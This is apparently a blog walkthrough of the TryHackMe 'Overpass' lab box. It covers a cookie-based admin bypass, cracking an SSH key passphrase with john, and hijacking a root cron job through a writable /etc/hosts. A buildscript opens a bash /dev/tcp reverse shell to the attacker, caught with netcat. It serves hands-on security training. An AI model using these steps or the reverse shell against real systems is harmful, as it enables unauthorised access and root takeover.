Overpass is an easy difficulty box on [TryHackMe](https://www.tryhackme.com). Below are the steps taken to root this box.

First, let's scan the box with **nmap -A [machine ip]**.

It appears that SSH and HTTP are the two protocols in use. Let's visit the website and see what shows up there.

![Overpass website](/assets/img/Overpass2.png)

It appears that this is a website for an application that stores your passwords for you. Let's take a look at the Downloads page.

![Overpass Downloads page](/assets/img/Overpass3.png)

This site has both binaries for most OSes and even the source code available for this program. Let's have a look at the source code.

A review of the source code makes a couple of things stand out. The first is that the encryption is done with ROT47, which is trivial to crack (and no where near the "military grade" encryption listed on the main page).

![Overpass source code 1](/assets/img/Overpass4.png)

The second thing that appears further down in the code is that it seems to store the "encrypted" password in the user's home directory with a file named .overpass.

![Overpass source code 2](/assets/img/Overpass5.png)

The About Us page did not seem to have much that was useful, so I decided to run **gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50** to enumerate the website for hidden directories. Within a few moments, **/admin** showed up.

Let's take a look at this page and see what's there.

![Overpass website admin](/assets/img/Overpass7.png)

After a few attempts of logging in with common credentials, it appeared that this would either need to be brute forced, or that some other method could be used to bypass authentication. I decided to review the source code of this page.

![Overpass admin source code](/assets/img/Overpass8.png)

In the \<head\> section of this page, there were references to 3 scripts. Let's take a look at the source of login.js to see if we can figure out a weakness in the authentication.

![Overpass login.js source code](/assets/img/Overpass9.png)

It appears that this code takes the credentials you provided and waits for a response from the API to validate your credentials. If validated, it set's a SessionToken cookie and lets you login. However, if they are not correct, it appears to delete the password you supplied and supply you with a message stating Incorrect Credentials.

Based on the fact that the hint said you do not brute force on this box, I opened **Developer Tools**, went to the **Console** tab, and entered **Cookies.set("SessionToken", 200)** and pressed Enter. I selected 200 based on it being the OK status response code for HTTP, but I don't believe it really matters what value is entered.

![Overpass console SessionToken cookie](/assets/img/Overpass10.png)

This created a cookie named **SessionToken**, let's refresh the **/admin** page and see what happens.

![Overpass admin login RSA](/assets/img/Overpass11.png)

Success! We were able to bypass authentication and retrieve a private SSH key. It appears to be for the user  **james** based on the comments above the RSA key. It also suggests cracking the password if we forgot it. Since we don't know it, lets crack it with john.

First, copy everything from **-----BEGIN RSA PRIVATE KEY-----** to **-----END RSA PRIVATE KEY-----** and save it in a file. I saved it as **overpass.txt**.

![Overpass private rsa key](/assets/img/Overpass12.png)

Next, on my attacker PC, I ran **cd /usr/share/john** and ran **python ssh2john.py ~/overpass.txt > ~/overpass.hashes**. This will convert the **overpass.txt** file in my home directory to a hash that john can use to attempt to crack the password.

![Ovverpass ssh2john.py](/assets/img/Overpass13.png)

Next, I navigated back to my home directory with **cd ~** and ran **john overpass.hashes -wordlist=/usr/share/wordlists/rockyou.txt**. Within moments, james' password for his private key has been cracked.

![Overpass crack rsa key password](/assets/img/Overpass14.png)

Now that we have the private key password, let's try to connect to the victim computer. Before doing so, we need to change the permissions on the private key by running **chmod 600 overpass.txt**. Now, run **ssh -i overpass.txt james@[machine ip]**. Enter the password you cracked with john when prompted.

![Overpass james SSH](/assets/img/Overpass15.png)

Success! We are now connected as james. Let's run **ls -al** where you will see the **user.txt** flag. Let's run **cat user.txt** and you will be able to retrieve that flag's value.

![Overpass user.txt](/assets/img/Overpass16.png)

There is also two other interesting files in this folder, **todo.txt** and **.overpass**. Based on the source code you reviewed earlier, you know that **.overpass** is the file that contains credentials in it. Let's run **cat .overpass** to see what's in it. 

![Overpass .overpass](/assets/img/Overpass17.png)

We also know from the source code that ROT47 is used in this file. Let's open up [CyberChef](https://gchq.github.io/CyberChef/) to decrypt this file.

![Overpass cyberchef](/assets/img/Overpass18.png)

We are able to uncover a password for something named **System**, which doesn't seem to mean much as of yet. Let's go back to our victim SSH session and start enumeration. Let's run **sudo -l** and see what comes up. It prompts you for a password. Let's enter the one we just decoded.

![Overpass sudo -l](/assets/img/Overpass19.png)

While this is james' password, he is not a member of the sudoers file so he can't run any sudo commands. Let's copy over linpeas.sh next to do some enumeration. On your attacker PC, navigate to the folder you have this tool saved in and type **python3 -m http.server** to serve up an http server.

![Overpass python3 http server](/assets/img/Overpass20.png)

Next, from james' SSH session, run **wget http://[attacker ip]:8000/linpeas.sh**. Once downloaded, run **chmod +x linpeas.sh** and then **./linpeas.sh** to execute the script.

![Overpass wget linpeas.sh](/assets/img/Overpass21.png)

This will start the enumeration process for this script. It appears that there is a curl job running as root every minute that is running a script to build something in bash.

![Overpass linpeas cronjob](/assets/img/Overpass22.png)

Let's run **cat /etc/crontab** to confirm that this is indeed in the system-wide crontab file.

![Overpass system crontab](/assets/img/Overpass23.png)

It is present, and it looks like it is running a script from a site called overpass.thm. Let's run **ping -c 4 overpass.thm** and see what IP address is returned.

![Overpass ping overpass.thm](/assets/img/Overpass24.png)

It returns the localhost IP. Let's navigate to **cd /etc** and run **ls -al|grep hosts**.

![Overpass /etc/hosts permissions](/assets/img/Overpass25.png)

It appears that this file is misconfigured, as all users have the ability to write to the hosts file. Let's run **nano hosts** and see what is in the file. We are able to open and modify the hosts file's IP addresses. Let's change the entry for **overpass.thm** to your attacker's IP address, so that way it is looking for the buildscript.sh file on your attacker pc.

![Overpass modify /etc/hosts](/assets/img/Overpass26.png)

Next, let's run **ping overpass.thm** to ensure it returns our attacker's IP address.

![Overpass ping overpass.thm](/assets/img/Overpass27.png)

Success, it is now reaching out to your attacker PC over port 80 to attempt to download this file (as port 80 is the default for http). Let's create a new buildscript.sh file to be utilized. First, create a **downloads** folder with a **src** folder inside of it so it mirrors the path that is specified in the cron job (these can be done with **mkdir**). Next, create a **buildscript.sh file** with **!bin/sh** on the first line, and then **bash -i >& /dev/tcp/[attacker ip]4444 0>&1** and save this file.

![Overpass buildscript.sh](/assets/img/Overpass28.png)

Next, open a new terminal tab and run **nc -nvlp 4444** to start a netcat listener to catch the reverse shell from your victim.

![Overpass nc listener](/assets/img/Overpass29.png)

Next, start a new http server over port 80 on the directory above the downloads directory (so that way the cron job looks for your attacker IP/downloads/src/buildscript.sh) with **python3 -m http.server 80**, After a minute, you should see a request on your python http server requesting the script we created. 

![Overpass python3 http server port 80](/assets/img/Overpass30.png)

Once that's done, navigate over to the terminal window with your netcat listener and you should have a reverse shell.

![Overpass nc root reverse shell](/assets/img/Overpass31.png)

We now have a shell as root! This is due to the fact that this job ran as root based on the user listed in the system wide crontab. Let's navigate to root's home directory with **cd /root** and type **cat root.txt** to get the final flag.
